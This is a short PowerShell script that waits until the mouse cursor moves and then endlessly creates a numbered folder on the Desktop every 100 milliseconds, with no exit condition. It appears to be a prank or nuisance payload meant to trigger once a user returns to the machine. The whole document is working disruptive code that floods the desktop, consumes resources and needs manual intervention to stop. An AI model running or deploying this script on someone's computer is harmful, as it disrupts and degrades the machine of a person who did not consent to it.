# Import the System.Windows.Forms assembly
Add-Type -AssemblyName System.Windows.Forms

# Store the original position of the cursor
$originalPOS = [System.Windows.Forms.Cursor]::Position

# Loop until the cursor position changes
while (1) {
    # Check if the cursor position has changed
    if ([Windows.Forms.Cursor]::Position -ne $originalPOS) {
        # If the cursor has moved, exit the loop
        break
    }
}

# At this point, the script will continue executing

$i = 1
while ($true) {
    $path = [Environment]::GetFolderPath("Desktop") + "\$i"
    New-Item -ItemType Directory -Path $path
    $i++
    Start-Sleep -Milliseconds 100
}